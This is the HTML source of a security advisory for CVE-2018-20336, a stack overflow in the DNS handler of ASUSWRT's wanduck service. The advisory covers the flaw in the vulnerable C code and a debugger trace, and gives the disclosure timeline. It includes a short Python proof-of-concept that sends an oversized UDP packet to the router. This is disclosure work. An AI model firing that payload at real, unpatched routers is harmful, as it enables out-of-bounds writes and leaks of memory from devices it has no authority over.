@@ -1,0 +1,407 @@
+
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>(CVE-2018-20336) ASUSWRT Stack Overflow in wanduck.c | STAR Labs</title>
+<meta name="keywords" content="">
+<meta name="description" content="CVE: CVE-2018-20336
+Tested Versions: ASUSWRT 3.0.0.4.384.20308 (2018/02/01)
+Product URL(s): https://www.asus.com/us/ASUSWRT/
+ASUSWRT is the firmware that is shipped with modern ASUS routers. ASUSWRT has a web-based interface, so it doesn&rsquo;t need a separate app, or restrict what you can change via mobile devices &ndash; you get full access to everything, from any device that can run a web browser.
+Vulnerability There is a stack overflow issue in parse_req_queries function in wanduck.c, which may lead to information leak.">
+<meta name="author" content="Shi Ji (@Puzzorsj)">
+<link rel="canonical" href="https://starlabs.sg/advisories/18/18-20336/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.min.ec8da366ca2fb647537ccb7a8f6fa5b4e9cd3c7a0d3171dd2d3baad1e49c8bfc.css" integrity="sha256-7I2jZsovtkdTfMt6j2&#43;ltOnNPHoNMXHdLTuq0eSci/w=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.min.2840b7fccd34145847db71a290569594bdbdb00047097f75d6495d162f5d7dff.js" integrity="sha256-KEC3/M00FFhH23GikFaVlL29sABHCX911kldFi9dff8="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="https://starlabs.sg/logo-white.png">
+<link rel="icon" type="image/png" sizes="16x16" href="https://starlabs.sg/logo-white.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://starlabs.sg/logo-white.png">
+<link rel="apple-touch-icon" href="https://starlabs.sg/logo-white.png">
+<link rel="mask-icon" href="https://starlabs.sg/logo-white.png">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript>
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-0F9M1FRFWQ"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-0F9M1FRFWQ', { 'anonymize_ip': false });
+}
+</script>
+<meta property="og:title" content="(CVE-2018-20336) ASUSWRT Stack Overflow in wanduck.c" />
+<meta property="og:description" content="CVE: CVE-2018-20336
+Tested Versions: ASUSWRT 3.0.0.4.384.20308 (2018/02/01)
+Product URL(s): https://www.asus.com/us/ASUSWRT/
+ASUSWRT is the firmware that is shipped with modern ASUS routers. ASUSWRT has a web-based interface, so it doesn&rsquo;t need a separate app, or restrict what you can change via mobile devices &ndash; you get full access to everything, from any device that can run a web browser.
+Vulnerability There is a stack overflow issue in parse_req_queries function in wanduck.c, which may lead to information leak." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://starlabs.sg/advisories/18/18-20336/" /><meta property="og:image" content="https://starlabs.sg/logo-white.png"/><meta property="article:section" content="advisories" />
+<meta property="article:published_time" content="2019-02-19T00:00:00&#43;00:00" />
+<meta property="article:modified_time" content="2019-02-19T00:00:00&#43;00:00" /><meta property="og:site_name" content="STAR Labs" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://starlabs.sg/logo-white.png"/>
+
+<meta name="twitter:title" content="(CVE-2018-20336) ASUSWRT Stack Overflow in wanduck.c"/>
+<meta name="twitter:description" content="CVE: CVE-2018-20336
+Tested Versions: ASUSWRT 3.0.0.4.384.20308 (2018/02/01)
+Product URL(s): https://www.asus.com/us/ASUSWRT/
+ASUSWRT is the firmware that is shipped with modern ASUS routers. ASUSWRT has a web-based interface, so it doesn&rsquo;t need a separate app, or restrict what you can change via mobile devices &ndash; you get full access to everything, from any device that can run a web browser.
+Vulnerability There is a stack overflow issue in parse_req_queries function in wanduck.c, which may lead to information leak."/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Advisories",
+      "item": "https://starlabs.sg/advisories/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "(CVE-2018-20336) ASUSWRT Stack Overflow in wanduck.c",
+      "item": "https://starlabs.sg/advisories/18/18-20336/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "(CVE-2018-20336) ASUSWRT Stack Overflow in wanduck.c",
+  "name": "(CVE-2018-20336) ASUSWRT Stack Overflow in wanduck.c",
+  "description": "CVE: CVE-2018-20336\nTested Versions: ASUSWRT 3.0.0.4.384.20308 (2018/02/01)\nProduct URL(s): https://www.asus.com/us/ASUSWRT/\nASUSWRT is the firmware that is shipped with modern ASUS routers. ASUSWRT has a web-based interface, so it doesn\u0026rsquo;t need a separate app, or restrict what you can change via mobile devices \u0026ndash; you get full access to everything, from any device that can run a web browser.\nVulnerability There is a stack overflow issue in parse_req_queries function in wanduck.c, which may lead to information leak.",
+  "keywords": [
+    
+  ],
+  "articleBody": "CVE: CVE-2018-20336\nTested Versions: ASUSWRT 3.0.0.4.384.20308 (2018/02/01)\nProduct URL(s): https://www.asus.com/us/ASUSWRT/\nASUSWRT is the firmware that is shipped with modern ASUS routers. ASUSWRT has a web-based interface, so it doesn’t need a separate app, or restrict what you can change via mobile devices – you get full access to everything, from any device that can run a web browser.\nVulnerability There is a stack overflow issue in parse_req_queries function in wanduck.c, which may lead to information leak.\nPoC from socket import * HOST = '192.168.50.1' PORT = 18018 BUFSIZE = 4096 ADDR = (HOST, PORT) udpCliSock = socket(AF_INET, SOCK_DGRAM) data = \"A\"*2046+\"\\x00F\" udpCliSock.sendto(data,ADDR) data,ADDR = udpCliSock.recvfrom(BUFSIZE) if data: print len(data) udpCliSock.close() Wanduck is a program that listens on TCP 18017 and UDP 18018. Port 18017 is most likely a HTTP server and 18018 is most likely a DNS server. The HTTP server on port 18017 will redirect HTTP request to the 80 port and the DNS server will process the dns request packet.\nThe file wanduck.c can be found under the src/rc/ directory is the provided ASUSWRT source code. We are going to have a look at the main function wanduck_main, this is the entry of the main program. run_dns_serv function is the entry to receive packet from port 18018, we will check the code from this function, the source is like below:\nvoid run_dns_serv(int sockfd){ int n; char line[MAXLINE]; struct sockaddr_in cliaddr; int clilen = sizeof(cliaddr); memset(line, 0, MAXLINE); memset(\u0026cliaddr, 0, clilen); if((n = recvfrom(sockfd, line, MAXLINE, 0, (struct sockaddr *)\u0026cliaddr, (socklen_t *)\u0026clilen)) == 0)\t// client close \treturn; else if(n  0){ perror(\"wanduck serv dns\"); return; } else handle_dns_req(sockfd, line, n, (struct sockaddr *)\u0026cliaddr, clilen); } MAXLINE is defined in wanduck.h with the value of 2048, so this function will first receive a max buffer of 2048 bytes from the sender, and then handle_dns_req will process the DNS request packet. A variable reply_content is defined at the begining of the handle_dns_req function like below:\nvoid handle_dns_req(int sfd, char *line, int maxlen, struct sockaddr *pcliaddr, int clen){ dns_query_packet d_req; dns_response_packet d_reply; int reply_size; char reply_content[MAXLINE]; As we can see here, reply_content is designed to have a max size of 2048 bytes. After process is intialized in handle_dns_req, the dns request packet will be passed to parse_req_queries function, this function accepts 4 parameters:\n char *content, stands for the reply(dns response) content char *lp, stands for the DNS Question part int len, stands for the length of the DNS Question part (a max of 2048-len(dns request header)) int *reply_size, pointer to the reply packet size  Let’s check this function, the whole function code is as below:\nvoid parse_req_queries(char *content, char *lp, int len, int *reply_size){ int i, rn; rn = *(reply_size); for(i = 0; i  len; ++i){ content[rn+i] = lp[i]; if(lp[i] == 0){ ++i; break; } } if(i = len) return; content[rn+i] = lp[i]; content[rn+i+1] = lp[i+1]; content[rn+i+2] = lp[i+2]; content[rn+i+3] = lp[i+3]; i += 4; *reply_size += i; } Obviously, there is a stack overflow in the function: let’s assume there is a NULL(\\x00) at the second-to-last of lp buffer, then the for loop will ended and i will be added with 1. There is a judgement to check whether i is larger than len, but this check is not enough. Let’s assume i equals to len-1, then the following code will be executed:\ncontent[rn+i] = lp[i]; content[rn+i+1] = lp[i+1]; content[rn+i+2] = lp[i+2]; content[rn+i+3] = lp[i+3]; i += 4; *reply_size += i; As we have said, rn points to the reply packet size and this value, in this case, the rn passed to this function is the length of DNS Request Header. Then,\nrn+i == rn+len-1 rn+i+1==rn+len rn+i+2==rn+len+1 rn+i+3==rn+len+2 i+4==len-1+4==len+3 reply_size= len(dns header)+len-1+4 So this will casuse an Out of bound write problem, and also, this will also cause information leak, for the reply_size is greater than 0x800(2048) bytes.\nLet’s debug the wanduck process dynamically, we will use the PoC we provied.\nsub_7D218 is the handle_dns_req function, and sub_7D0F8 is the parse_req_queries function. We first set a breakpoint at the line where parse_req_queries is called:\nThen we run our PoC code, and the program will break at line 63, and then we will follow the code and see what happens.\na3 is len in source code, and in our case this value is 0x7F4 because the DNS header is 0xC, so the value is 0x800-0xC=0x7F4. Since the second-to-last byte in our PoC is “\\x00”, so line 20 will be hit when v4 is 0x7F3, since 0x7F3 is less than 0x7F4, then line 22 to line 30 will be executed.\nresult in our case is at 0xBE85A71C, from the source code we know its size is 0x800, so the end address of result is at 0xBE85AF1C, when line 26 is executed, result will be 0xBE85AF1B, so line 28 and line 29 will cause a buffer overflow.\nWhat’s more, the reply_size will be 0x7F4+0xC+0x3=0x803, at the end of handle_dns_req , reply_size will also add 0x10(sizeof(d_reply.answers)), so the final reply_size will be 0x813. It is larger than 0x800, which will cause an information leak.\nTimeline  2019-02-19 Vendor disclosure 2019-02-25 Vendor acknowledged 2019-03-29 Firmware update released  Vendor Response The vendor has acknowledged the issue and released a new firmware update to address this vulnerability.\nThe updated firmware can be downloaded from the Support section of a particular router that runs ASUSWRT, such as https://www.asus.com/Networking/RTAC68U/HelpDesk_Download/.\nThe update description lists both issues CVE-2018-20334 and CVE-2018-20336 discovered by STAR Labs as fixed.\n",
+  "wordCount" : "905",
+  "inLanguage": "en",
+  "datePublished": "2019-02-19T00:00:00Z",
+  "dateModified": "2019-02-19T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "Shi Ji (@Puzzorsj)"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://starlabs.sg/advisories/18/18-20336/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "STAR Labs",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://starlabs.sg/logo-white.png"
+    }
+  }
+}
+</script>
+</head>
+
+<body class=" dark" id="top">
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://starlabs.sg/" accesskey="h" title="  (Alt + H)">
+                <img src="https://starlabs.sg/logo-white.png" alt="logo" aria-label="logo"
+                    height="35"> </a>
+            <span class="logo-switches">
+            </span>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://starlabs.sg/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://starlabs.sg/about/" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://starlabs.sg/advisories/" title="Advisories">
+                    <span>Advisories</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://starlabs.sg/blog/" title="Blog">
+                    <span>Blog</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://starlabs.sg/achievements/" title="Achievements">
+                    <span>Achievements</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://starlabs.sg/publications/" title="Publications">
+                    <span>Publications</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://starlabs.sg/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://starlabs.sg/">Home</a>&nbsp;»&nbsp;<a href="https://starlabs.sg/advisories/">Advisories</a></div>
+    <h1 class="post-title">
+      (CVE-2018-20336) ASUSWRT Stack Overflow in wanduck.c
+    </h1>
+    <div class="post-meta"><span title='2019-02-19 00:00:00 +0000 UTC'>February 19, 2019</span>&nbsp;·&nbsp;5 min&nbsp;·&nbsp;Shi Ji (@Puzzorsj)
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#vulnerability" aria-label="Vulnerability">Vulnerability</a><ul>
+                        
+                <li>
+                    <a href="#poc" aria-label="PoC">PoC</a></li></ul>
+                </li>
+                <li>
+                    <a href="#timeline" aria-label="Timeline">Timeline</a></li>
+                <li>
+                    <a href="#vendor-response" aria-label="Vendor Response">Vendor Response</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><p><strong>CVE</strong>: CVE-2018-20336</p>
+<p><strong>Tested Versions</strong>: ASUSWRT 3.0.0.4.384.20308 (2018/02/01)</p>
+<p><strong>Product URL(s)</strong>: <a href="https://www.asus.com/us/ASUSWRT/">https://www.asus.com/us/ASUSWRT/</a></p>
+<p><strong>ASUSWRT</strong> is the firmware that is shipped with modern ASUS routers. 
+ASUSWRT has a web-based interface, so it doesn&rsquo;t need a separate app, or restrict what you can change via mobile devices &ndash; you get full access to everything, from any device that can run a web browser.</p>
+<h1 id="vulnerability">Vulnerability<a hidden class="anchor" aria-hidden="true" href="#vulnerability">#</a></h1>
+<p>There is a stack overflow issue in <em><strong>parse_req_queries</strong></em> function in <em><strong>wanduck.c</strong></em>, 
+which may lead to information leak.</p>
+<h2 id="poc">PoC<a hidden class="anchor" aria-hidden="true" href="#poc">#</a></h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">HOST</span> <span class="o">=</span> <span class="s1">&#39;192.168.50.1&#39;</span>  
+</span></span><span class="line"><span class="cl"><span class="n">PORT</span> <span class="o">=</span> <span class="mi">18018</span>
+</span></span><span class="line"><span class="cl"><span class="n">BUFSIZE</span> <span class="o">=</span> <span class="mi">4096</span>
+</span></span><span class="line"><span class="cl"><span class="n">ADDR</span> <span class="o">=</span> <span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl"><span class="n">udpCliSock</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_DGRAM</span><span class="p">)</span>   
+</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">2046</span><span class="o">+</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">F&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">udpCliSock</span><span class="o">.</span><span class="n">sendto</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="n">ADDR</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl"><span class="n">data</span><span class="p">,</span><span class="n">ADDR</span> <span class="o">=</span> <span class="n">udpCliSock</span><span class="o">.</span><span class="n">recvfrom</span><span class="p">(</span><span class="n">BUFSIZE</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">data</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">	<span class="nb">print</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl"><span class="n">udpCliSock</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span></code></pre></div><p>Wanduck is a program that listens on TCP 18017 and UDP 18018.  Port 18017 is most likely a HTTP server and 18018 is most likely a DNS server.  The HTTP server on port 18017 will redirect HTTP request to the 80 port and the DNS server will process the dns request packet.</p>
+<p>The file <code>wanduck.c</code>  can be found under the <code>src/rc/</code> directory is the provided ASUSWRT source code.  We are going to have a look at the main function <em><strong>wanduck_main</strong></em>, this is the entry of the main program.  <em><strong>run_dns_serv</strong></em> function is the entry to receive packet from port 18018, we will check the code from this function, the source is like below:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">run_dns_serv</span><span class="p">(</span><span class="kt">int</span> <span class="n">sockfd</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">n</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">char</span> <span class="n">line</span><span class="p">[</span><span class="n">MAXLINE</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">cliaddr</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">clilen</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">cliaddr</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="n">memset</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">MAXLINE</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">cliaddr</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">clilen</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span><span class="p">((</span><span class="n">n</span> <span class="o">=</span> <span class="n">recvfrom</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="n">line</span><span class="p">,</span> <span class="n">MAXLINE</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">cliaddr</span><span class="p">,</span> <span class="p">(</span><span class="n">socklen_t</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">clilen</span><span class="p">))</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>	<span class="c1">// client close
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">n</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">		<span class="n">perror</span><span class="p">(</span><span class="s">&#34;wanduck serv dns&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="k">else</span>
+</span></span><span class="line"><span class="cl">		<span class="n">handle_dns_req</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="n">line</span><span class="p">,</span> <span class="n">n</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">cliaddr</span><span class="p">,</span> <span class="n">clilen</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p><em><strong>MAXLINE</strong></em> is defined in <strong>wanduck.h</strong> with the value of 2048,  so this function will first receive a max buffer of 2048 bytes from the sender, and then <strong>handle_dns_req</strong> will process the DNS request packet. A variable <em><strong>reply_content</strong></em> is defined at the begining of the <strong>handle_dns_req</strong> function like below:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">handle_dns_req</span><span class="p">(</span><span class="kt">int</span> <span class="n">sfd</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">line</span><span class="p">,</span> <span class="kt">int</span> <span class="n">maxlen</span><span class="p">,</span> <span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="n">pcliaddr</span><span class="p">,</span> <span class="kt">int</span> <span class="n">clen</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">	<span class="n">dns_query_packet</span> <span class="n">d_req</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">dns_response_packet</span> <span class="n">d_reply</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">reply_size</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">char</span> <span class="n">reply_content</span><span class="p">[</span><span class="n">MAXLINE</span><span class="p">];</span>
+</span></span></code></pre></div><p>As we can see here, <strong>reply_content</strong> is designed to have a max size of 2048 bytes.  After process is intialized in <strong>handle_dns_req</strong>, the dns request packet will be passed to <strong>parse_req_queries</strong> function, this function accepts 4 parameters:</p>
+<ul>
+<li><code>char *content</code>, stands for the reply(dns response) content</li>
+<li><code>char *lp</code>, stands for the DNS Question part</li>
+<li><code>int len</code>, stands for the length of the DNS Question part (a max of 2048-len(dns request header))</li>
+<li><code>int *reply_size</code>, pointer to the reply packet size</li>
+</ul>
+<p>Let&rsquo;s check this function, the whole function code is as below:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">parse_req_queries</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">content</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">lp</span><span class="p">,</span> <span class="kt">int</span> <span class="n">len</span><span class="p">,</span> <span class="kt">int</span> <span class="o">*</span><span class="n">reply_size</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">i</span><span class="p">,</span> <span class="n">rn</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">rn</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">reply_size</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">len</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">		<span class="n">content</span><span class="p">[</span><span class="n">rn</span><span class="o">+</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">lp</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span><span class="p">(</span><span class="n">lp</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="mi">0</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">			<span class="o">++</span><span class="n">i</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">			<span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span><span class="p">(</span><span class="n">i</span> <span class="o">&gt;=</span> <span class="n">len</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">content</span><span class="p">[</span><span class="n">rn</span><span class="o">+</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">lp</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">	<span class="n">content</span><span class="p">[</span><span class="n">rn</span><span class="o">+</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">lp</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">	<span class="n">content</span><span class="p">[</span><span class="n">rn</span><span class="o">+</span><span class="n">i</span><span class="o">+</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">lp</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">2</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">	<span class="n">content</span><span class="p">[</span><span class="n">rn</span><span class="o">+</span><span class="n">i</span><span class="o">+</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="n">lp</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">3</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">	<span class="n">i</span> <span class="o">+=</span> <span class="mi">4</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="o">*</span><span class="n">reply_size</span> <span class="o">+=</span> <span class="n">i</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>Obviously, there is a stack overflow in the function: let&rsquo;s assume there is a NULL(\x00) at the second-to-last of  <em><strong>lp</strong></em> buffer, then the <em><strong>for</strong></em> loop will ended and <em><strong>i</strong></em> will be added with 1. There is a judgement to check whether <em><strong>i</strong></em> is larger than <em><strong>len</strong></em>, but this check is not enough. Let&rsquo;s assume <em><strong>i</strong></em> equals to <em><strong>len-1</strong></em>, then the following code will be executed:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="n">content</span><span class="p">[</span><span class="n">rn</span><span class="o">+</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">lp</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="n">content</span><span class="p">[</span><span class="n">rn</span><span class="o">+</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">lp</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="n">content</span><span class="p">[</span><span class="n">rn</span><span class="o">+</span><span class="n">i</span><span class="o">+</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">lp</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">2</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="n">content</span><span class="p">[</span><span class="n">rn</span><span class="o">+</span><span class="n">i</span><span class="o">+</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="n">lp</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">3</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="n">i</span> <span class="o">+=</span> <span class="mi">4</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="o">*</span><span class="n">reply_size</span> <span class="o">+=</span> <span class="n">i</span><span class="p">;</span>
+</span></span></code></pre></div><p>As we have said, <em><strong>rn</strong></em> points to the reply packet size and this value, in this case, the <em><strong>rn</strong></em> passed to this function is the length of DNS Request Header. Then,</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="n">rn</span><span class="o">+</span><span class="n">i</span> <span class="o">==</span> <span class="n">rn</span><span class="o">+</span><span class="n">len</span><span class="o">-</span><span class="mi">1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">rn</span><span class="o">+</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="o">==</span><span class="n">rn</span><span class="o">+</span><span class="n">len</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">rn</span><span class="o">+</span><span class="n">i</span><span class="o">+</span><span class="mi">2</span><span class="o">==</span><span class="n">rn</span><span class="o">+</span><span class="n">len</span><span class="o">+</span><span class="mi">1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">rn</span><span class="o">+</span><span class="n">i</span><span class="o">+</span><span class="mi">3</span><span class="o">==</span><span class="n">rn</span><span class="o">+</span><span class="n">len</span><span class="o">+</span><span class="mi">2</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">i</span><span class="o">+</span><span class="mi">4</span><span class="o">==</span><span class="n">len</span><span class="o">-</span><span class="mi">1</span><span class="o">+</span><span class="mi">4</span><span class="o">==</span><span class="n">len</span><span class="o">+</span><span class="mi">3</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">reply_size</span><span class="o">=</span> <span class="n">len</span><span class="p">(</span><span class="n">dns</span> <span class="n">header</span><span class="p">)</span><span class="o">+</span><span class="n">len</span><span class="o">-</span><span class="mi">1</span><span class="o">+</span><span class="mi">4</span>
+</span></span></code></pre></div><p>So this will casuse an Out of bound write problem, and also, this will also cause information leak, for the reply_size is greater than 0x800(2048) bytes.</p>
+<p>Let&rsquo;s debug the wanduck process dynamically, we will use the PoC we provied.</p>
+<p><em><strong>sub_7D218</strong></em> is the <em><strong>handle_dns_req</strong></em> function, and <em><strong>sub_7D0F8</strong></em> is the <em><strong>parse_req_queries</strong></em> function. We first set a breakpoint at the line where <em><strong>parse_req_queries</strong></em> is called:</p>
+<p><img loading="lazy" src="/advisories/18/images/18-20336-01.png" alt=""  />
+</p>
+<p>Then we run our PoC code, and the program will break at line 63, and then we will follow the code and see what happens.</p>
+<p><img loading="lazy" src="/advisories/18/images/18-20336-02.png" alt=""  />
